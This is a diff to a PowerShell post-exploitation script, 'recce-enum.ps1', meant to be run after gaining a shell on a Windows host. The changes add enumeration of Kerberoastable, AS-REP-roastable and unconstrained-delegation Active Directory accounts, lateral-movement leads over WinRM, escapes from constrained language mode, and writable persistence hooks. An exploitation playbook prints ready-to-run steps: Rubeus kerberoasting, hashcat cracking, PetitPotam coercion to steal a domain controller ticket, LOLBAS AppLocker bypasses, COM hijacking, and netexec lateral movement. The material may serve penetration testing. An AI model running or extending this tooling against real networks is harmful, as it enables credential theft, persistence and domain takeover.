@@ -2,9 +2,11 @@
   recce-enum.ps1 - thorough, READ-ONLY local enumeration for Windows.
 
   The on-target companion to recce: run this once you have a shell on a Windows
-  host to surface privilege-escalation vectors and sensitive exposure (a
-  winPEAS-style sweep). It changes NOTHING - only reads system state with
-  built-in cmdlets / reg queries - so it is safe to run and does not behave like
+  host to surface privilege-escalation vectors, lateral-movement / pivot leads
+  (WinRM, mapped drives, Kerberoast / AS-REP / unconstrained-delegation targets),
+  restricted-environment escapes and persistence footholds, plus sensitive
+  exposure (a winPEAS-style sweep). It changes NOTHING - only reads system state
+  with built-in cmdlets / reg queries - so it is safe to run and does not behave like
   malware. No exploit code, no download, no obfuscation, no AMSI/Defender
   tampering. Being a plain read-only Get-* script is exactly why it does not
   match malware signatures; if an EDR still false-positives, coordinate an
@@ -86,6 +88,8 @@ if($SelfTest){
     'Credentials'           = @('cmdkey','klist','netsh','reg')
     'Hardening / Defender'  = @('Get-MpComputerStatus','Get-BitLockerVolume','Get-AppLockerPolicy')
     'Network'               = @('ipconfig','netstat','Get-SmbShare','Get-NetFirewallProfile')
+    'Lateral (AD/WinRM)'    = @('net','arp','Get-Service','Get-CimInstance')
+    'Persistence hooks'     = @('Get-WmiObject','Get-ChildItem','Get-ItemProperty')
     'Core (always needed)'  = @('whoami','Get-ItemProperty','Get-Process')
   }
   foreach($k in $checks.Keys){
@@ -424,6 +428,79 @@ Get-CimInstance Win32_Process | ForEach-Object {
 Sec "Environment variables"
 Get-ChildItem Env: | ForEach-Object { Info ($_.Name + "=" + $_.Value) }
 
+# ============================================================ lateral movement
+Sec "Lateral movement & pivoting"
+Info "Mapped drives / cached sessions (net use):"
+(net use) 2>$null | ForEach-Object { Info $_ }
+$winrm = Get-Service WinRM -ErrorAction SilentlyContinue
+if($winrm -and $winrm.Status -eq 'Running'){ Info "WinRM running (PSRemoting reachable in/out)"; Flag WINRM_LATERAL 1 }
+$th = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
+if($th){ Info ("WinRM TrustedHosts: " + $th + "  (outbound PSRemoting targets)") }
+Info "ARP cache (reachable hosts):"
+(arp -a) 2>$null | Select-String 'dynamic' | Select-Object -First 20 | ForEach-Object { Info $_.ToString().Trim() }
+# AD-joined: read-only LDAP queries for the classic lateral/roasting targets.
+$cs2 = Get-CimInstance Win32_ComputerSystem
+if($cs2.PartOfDomain){
+  Info ("Domain: " + $cs2.Domain)
+  try{
+    $root = ([ADSI]"LDAP://RootDSE").defaultNamingContext
+    $ds = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$root")
+    $ds.PageSize = 200
+    $ds.ClientTimeout = [TimeSpan]::FromSeconds(15)
+    # Kerberoastable: user accounts carrying an SPN.
+    $ds.Filter = "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))"
+    $spn = @($ds.FindAll() | ForEach-Object { $_.Properties['samaccountname'] -join '' })
+    if($spn.Count){ Finding ("Kerberoastable accounts (SPN set): " + ($spn -join ', ')); Flag KERBEROAST ($spn -join ',') }
+    # AS-REP roastable: DONT_REQ_PREAUTH (0x400000).
+    $ds.Filter = "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+    $asrep = @($ds.FindAll() | ForEach-Object { $_.Properties['samaccountname'] -join '' })
+    if($asrep.Count){ Finding ("AS-REP roastable accounts (no Kerberos pre-auth): " + ($asrep -join ', ')); Flag ASREP ($asrep -join ',') }
+    # Unconstrained delegation (TRUSTED_FOR_DELEGATION 0x80000) - coerce + capture a TGT.
+    $ds.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+    $unc = @($ds.FindAll() | ForEach-Object { $_.Properties['name'] -join '' })
+    if($unc.Count){ Finding ("Unconstrained-delegation hosts: " + ($unc -join ', ') + " -> coerce auth + capture a TGT"); Flag DELEGATION ($unc -join ',') }
+  }catch{ Info "  (AD queries unavailable / no reachable DC in this context)" }
+}
+if(Get-Command sqlcmd -ErrorAction SilentlyContinue){ Info "sqlcmd present -> enumerate MSSQL linked servers (EXEC sp_linkedservers) for onward code exec" }
+
+# ============================================================ restricted environment
+Sec "Restricted environment & escape surface"
+Info ("Language mode: " + $ExecutionContext.SessionState.LanguageMode)
+if($ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage'){
+  Finding "PowerShell ConstrainedLanguage mode -> WDAC/AppLocker enforced; pivot via signed LOLBAS or a full-language runspace (documented bypasses)"; Flag CLM 1
+}
+Get-PSSessionConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '^microsoft' } | ForEach-Object {
+  Info ("PSSession endpoint (possible JEA): " + $_.Name + "  RunAs=" + $_.RunAsUser)
+}
+try{ if(Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue){ Info "AppLocker effective policy present -> LOLBAS in allowed dirs may still run" } }catch{}
+
+# ============================================================ persistence footholds
+Sec "Persistence footholds (writable auto-exec hooks)"
+# Read-only DETECTION of auto-run hooks (both a persistence surface and, if a
+# privileged principal triggers one, an escalation path). Nothing is written.
+foreach($pf in @($PROFILE.AllUsersAllHosts, $PROFILE.CurrentUserAllHosts)){
+  if($pf){
+    if((Test-Path $pf) -and (TestWritable $pf)){ Finding ("Writable PowerShell profile: " + $pf); Flag PS_PROFILE $pf }
+    elseif((-not (Test-Path $pf)) -and (TestWritable (Split-Path $pf))){ Info ("PS profile dir writable (can be created): " + (Split-Path $pf)) }
+  }
+}
+Info "COM hijack surface (writable HKCU CLSID InprocServer32), sampled:"
+Get-ChildItem 'HKCU:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | Select-Object -First 200 | ForEach-Object {
+  $ips = Join-Path $_.PSPath 'InprocServer32'
+  if((Test-Path $ips) -and (TestWritable $ips)){ Finding ("Writable HKCU COM InprocServer32: " + $_.PSChildName); Flag COM_HIJACK $_.PSChildName }
+}
+$wf = @(Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue)
+$wc = @(Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue)
+if($wf.Count -or $wc.Count){ Finding ("WMI event subscriptions present (" + $wf.Count + " filters, " + $wc.Count + " consumers) -> review for stealth persistence"); Flag WMI_PERSIST ($wf.Count.ToString() + "f/" + $wc.Count + "c") }
+$appinit = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'AppInit_DLLs'
+if($appinit){ $aiOn = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'LoadAppInit_DLLs'; Info ("AppInit_DLLs=" + $appinit + " (LoadAppInit_DLLs=" + $aiOn + ")") }
+foreach($ac in @('sethc.exe','utilman.exe','osk.exe','Magnify.exe')){
+  $dbg = RegGet ("HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + $ac) 'Debugger'
+  if($dbg){ Finding ("Accessibility hijack set on " + $ac + " -> " + $dbg + " (pre-logon SYSTEM shell at the lock screen)"); Flag ACCESSIBILITY ($ac + " -> " + $dbg) }
+}
+try{ (Get-Item 'HKLM:\SOFTWARE\Microsoft\Netsh' -ErrorAction SilentlyContinue).Property | ForEach-Object {
+  Info ("netsh helper DLL: " + $_ + " = " + (RegGet 'HKLM:\SOFTWARE\Microsoft\Netsh' $_)) } }catch{}
+
 # ============================================================ how to exploit
 # Tailored to the [!] findings above: only the vectors that ACTUALLY fired on
 # this host are printed, with the specific privilege / service / file substituted
@@ -567,6 +644,45 @@ if(PbHas WESNG){ Step "Missing-patch LPE (build-based)" ((PbVals WESNG) + @(
   'run    : (offline)  wes.py systeminfo.txt   or  Watson  -> ranked missing-KB LPE candidates',
   '         match a candidate to a public PoC (e.g. an afd.sys / clfs.sys / win32k LPE), compile, run.',
   'confirm: whoami  ->  nt authority\system   (test in a snapshot - kernel LPEs can bugcheck)')) }
+
+if(PbHas KERBEROAST){ Step "Kerberoast SPN accounts -> offline crack" ((PbVals KERBEROAST) + @(
+  'run    : Rubeus.exe kerberoast /nowrap        (or: impacket-GetUserSPNs <dom>/<user>:<pw> -request)',
+  'crack  : hashcat -m 13100 hashes.txt rockyou.txt      (service accounts often have weak passwords)',
+  'confirm: a cracked service-account password -> reuse / onward access')) }
+
+if(PbHas ASREP){ Step "AS-REP roast (no pre-auth) -> offline crack" ((PbVals ASREP) + @(
+  'run    : impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass   (or Rubeus asreproast)',
+  'crack  : hashcat -m 18200 asrep.txt rockyou.txt',
+  'confirm: a cracked account password')) }
+
+if(PbHas DELEGATION){ Step "Unconstrained delegation -> capture a privileged TGT" ((PbVals DELEGATION) + @(
+  'prereq : admin on the delegation host (this finding lists the hosts).',
+  'run    : Rubeus.exe monitor /interval:5   then coerce a DC (PetitPotam / printerbug) to auth to it;',
+  '         extract the DC TGT and pass-the-ticket.',
+  'confirm: DCSync / domain admin with the captured ticket')) }
+
+if(PbHas CLM){ Step "ConstrainedLanguage mode -> regain full language" @(
+  'run    : use signed LOLBAS (InstallUtil / MSBuild / regsvr32) to run code outside CLM, or a',
+  '         PowerShell v2 downgrade / custom runspace (documented AppLocker/WDAC bypasses).',
+  'confirm: $ExecutionContext.SessionState.LanguageMode -> FullLanguage') }
+
+if(PbHas PS_PROFILE -or PbHas COM_HIJACK){ Step "Writable PS profile / COM CLSID -> code exec on trigger" (
+  (PbVals PS_PROFILE | ForEach-Object { "profile: " + $_ }) + (PbVals COM_HIJACK | ForEach-Object { "clsid: " + $_ }) + @(
+  'profile: your commands run whenever that user starts PowerShell (privileged if an admin does).',
+  'com    : point the writable InprocServer32 at your DLL; loads when a privileged app instantiates the CLSID.',
+  'confirm: code exec in the triggering principal''s context')) }
+
+if(PbHas ACCESSIBILITY -or PbHas WMI_PERSIST){ Step "Existing persistence found - review / reuse" (
+  (PbVals ACCESSIBILITY) + (PbVals WMI_PERSIST | ForEach-Object { "wmi: " + $_ }) + @(
+  'accessibility: a sethc/utilman debugger gives a SYSTEM shell from the lock screen (Shift x5 / Win+U).',
+  'wmi    : inspect the __EventFilter/__EventConsumer pair (Get-WmiObject root\subscription) - it may be',
+  '         an implant or your own foothold; note it for the report either way.',
+  'confirm: understand what auto-runs and as whom')) }
+
+if(PbHas WINRM_LATERAL){ Step "WinRM reachable -> lateral with recovered creds" @(
+  'run    : netexec winrm <ip> -u <user> -p <pass>  (or -H <nthash>) -x whoami',
+  '         Enter-PSSession -ComputerName <ip> -Credential <user>   (interactive)',
+  'confirm: command output from the remote host as that user') }
 
 Emit ""
 Emit "  Every step above references an EXISTING public tool or technique - run it"
